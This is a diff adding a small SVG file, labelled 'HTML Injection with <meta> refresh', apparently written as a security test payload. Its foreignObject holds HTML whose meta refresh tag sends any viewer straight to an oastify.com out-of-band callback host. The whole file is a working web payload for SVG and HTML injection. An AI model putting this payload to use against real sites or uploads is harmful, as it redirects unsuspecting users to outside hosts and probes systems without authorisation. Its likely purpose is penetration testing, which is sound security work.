@@ -1,0 +1,12 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="300" height="200">
+  <foreignObject width="100%" height="100%">
+    <html xmlns="http://www.w3.org/1999/xhtml">
+      <head>
+        <meta http-equiv="refresh" content="0;url=https://v3zwj44thnzkomakipqtxxqge7ky8p2dr.oastify.com"/>
+      </head>
+      <body>
+        <p style="color:red;">HTML Injection with &lt;meta&gt; refresh</p>
+      </body>
+    </html>
+  </foreignObject>
+</svg>
